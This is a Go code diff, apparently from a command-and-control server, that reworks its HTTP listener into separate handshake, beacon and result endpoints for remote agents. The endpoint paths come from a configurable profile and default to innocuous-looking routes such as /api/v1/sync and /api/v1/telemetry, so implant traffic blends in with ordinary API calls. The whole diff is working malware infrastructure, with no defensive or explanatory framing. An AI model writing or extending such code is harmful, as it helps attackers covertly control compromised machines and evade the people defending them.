@@ -7,30 +7,44 @@ import (
 
 func startListener(addr, certFile, keyFile string) {
 	mux := http.NewServeMux()
-	mux.HandleFunc("/", handleC2)
 
-	log.Printf("[c2] listening on %s", addr)
+	handshakePath := PROFILE.Paths["handshake"]
+	if handshakePath == "" {
+		handshakePath = "/api/v1/auth"
+	}
+	beaconPath := PROFILE.Paths["beacon"]
+	if beaconPath == "" {
+		beaconPath = "/api/v1/sync"
+	}
+	resultPath := PROFILE.Paths["result"]
+	if resultPath == "" {
+		resultPath = "/api/v1/telemetry"
+	}
+
+	mux.HandleFunc(handshakePath, func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		handleHandshake(w, r, r.Header.Get("X-Agent-ID"))
+	})
+	mux.HandleFunc(beaconPath, func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodGet {
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		handleTaskPoll(w, r, r.Header.Get("X-Agent-ID"))
+	})
+	mux.HandleFunc(resultPath, func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		handleResult(w, r, r.Header.Get("X-Agent-ID"))
+	})
+
+	log.Printf("[c2] listening on %s (handshake=%s beacon=%s result=%s)", addr, handshakePath, beaconPath, resultPath)
 	if err := http.ListenAndServeTLS(addr, certFile, keyFile, mux); err != nil {
 		log.Fatalf("[c2] %v", err)
-	}
-}
-
-func handleC2(w http.ResponseWriter, r *http.Request) {
-	agentID := r.Header.Get("X-Agent-ID")
-
-	switch r.Method {
-	case "POST":
-		mu.Lock()
-		_, known := agents[agentID]
-		mu.Unlock()
-		if known {
-			handleResult(w, r, agentID)
-		} else {
-			handleHandshake(w, r, agentID)
-		}
-	case "GET":
-		handleTaskPoll(w, r, agentID)
-	default:
-		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 	}
 }
